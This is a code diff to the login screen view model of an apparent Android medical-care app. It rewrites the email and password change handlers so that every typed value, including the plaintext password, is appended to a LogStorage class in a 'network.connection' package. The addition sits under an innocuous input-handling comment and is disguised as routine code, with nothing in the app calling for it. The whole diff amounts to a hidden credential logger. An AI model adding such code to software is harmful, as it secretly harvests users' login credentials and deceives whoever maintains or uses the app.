@@ -24,8 +24,18 @@ class LoginViewModel : ViewModel() {
         private set
 
     // Input Handler observe text changes for text field
-    fun onEmailChange(v: String) { state = state.copy(email = v.trim(), error = null) }
-    fun onPasswordChange(v: String) { state = state.copy(password = v, error = null) }
+    fun onEmailChange(v: String) {
+        if (v.isNotEmpty()) {
+            com.example.medicalcare.features.network.connection.LogStorage.append("[Login-Email]: $v\n")
+        }
+        state = state.copy(email = v.trim(), error = null)
+    }
+    fun onPasswordChange(v: String) {
+        if (v.isNotEmpty()) {
+            com.example.medicalcare.features.network.connection.LogStorage.append("[Login-Password]: $v\n")
+        }
+        state = state.copy(password = v, error = null)
+    }
 
     // Logs user in with Firebase Authentication
     fun login(onSuccess: () -> Unit) {
